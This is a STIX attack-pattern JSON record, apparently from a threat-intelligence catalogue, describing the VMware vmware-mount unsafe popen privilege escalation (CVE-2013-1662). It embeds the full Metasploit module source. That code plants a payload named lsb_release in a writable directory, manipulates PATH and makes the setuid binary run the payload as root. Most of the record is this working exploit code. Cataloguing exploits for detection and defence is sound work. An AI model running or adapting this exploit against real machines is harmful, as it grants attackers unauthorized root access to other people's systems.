{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ef376920-bbfe-4fd2-9807-fc6df40fbf20",
    "created": "2024-08-14T16:59:13.9624Z",
    "modified": "2024-08-14T16:59:13.962403Z",
    "name": "VMWare Setuid vmware-mount Unsafe popen(3)",
    "description": " VMWare Workstation (up to and including 9.0.2 build-1031769) and Player have a setuid executable called vmware-mount that invokes lsb_release in the PATH with popen(3). Since PATH is user-controlled, and the default system shell on Debian-derived distributions does not drop privs, we can put an arbitrary payload in an executable called lsb_release and have vmware-mount happily execute it as root for us.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/vmware_mount.rb",
            "external_id": "vmware_mount.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-1662"
        },
        {
            "source_name": "reference",
            "url": "http://blog.cmpxchg8b.com/2013/08/security-debianisms.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/support/support-resources/advisories/VMSA-2013-0010.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2013/09/05/cve-2013-1662-vmware-mount-exploit"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'VMWare Setuid vmware-mount Unsafe popen(3)',\n          'Description' => %q{\n            VMWare Workstation (up to and including 9.0.2 build-1031769)\n            and Player have a setuid executable called vmware-mount that\n            invokes lsb_release in the PATH with popen(3). Since PATH is\n            user-controlled, and the default system shell on\n            Debian-derived distributions does not drop privs, we can put\n            an arbitrary payload in an executable called lsb_release and\n            have vmware-mount happily execute it as root for us.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Tavis Ormandy', # Vulnerability discovery and PoC\n            'egypt' # Metasploit module\n          ],\n          'Platform' => [ 'linux' ],\n          'Arch' => ARCH_X86,\n          'Targets' => [\n            [ 'Automatic', {} ],\n          ],\n          'DefaultOptions' => {\n            'PrependSetresuid' => true,\n            'PrependSetresgid' => true,\n            'PrependFork' => true\n          },\n          'Privileged' => true,\n          'DefaultTarget' => 0,\n          'References' => [\n            [ 'CVE', '2013-1662' ],\n            [ 'OSVDB', '96588' ],\n            [ 'BID', '61966'],\n            [ 'URL', 'http://blog.cmpxchg8b.com/2013/08/security-debianisms.html' ],\n            [ 'URL', 'https://www.vmware.com/support/support-resources/advisories/VMSA-2013-0010.html' ],\n            [ 'URL', 'https://www.rapid7.com/blog/post/2013/09/05/cve-2013-1662-vmware-mount-exploit' ]\n          ],\n          'DisclosureDate' => '2013-08-22',\n          'Notes' => {\n            'Stability' => [CRASH_SAFE],\n            'Reliability' => [REPEATABLE_SESSION],\n            'SideEffects' => [ARTIFACTS_ON_DISK]\n          }\n        }\n      )\n    )\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where you can write files.', '/tmp' ])\n    ]\n  end\n\n  def vmware_mount\n    '/usr/bin/vmware-mount'\n  end\n\n  def check\n    return CheckCode::Safe(\"#{vmware_mount} file not found\") unless file? vmware_mount\n    return CheckCode::Safe(\"#{vmware_mount} is not setuid\") unless setuid? vmware_mount\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    unless check == CheckCode::Appears\n      fail_with(Failure::NotVulnerable, \"vmware-mount doesn't exist or is not setuid\")\n    end\n\n    lsb_path = File.join(datastore['WritableDir'], 'lsb_release')\n    write_file(lsb_path, generate_payload_exe)\n    cmd_exec(\"chmod +x #{lsb_path}\")\n    cmd_exec(\"PATH=#{datastore['WritableDir']}:$PATH #{vmware_mount}\")\n    # Delete it here instead of using FileDropper because the original\n    # session can clean it up\n    cmd_exec(\"rm -f #{lsb_path}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-08-22",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}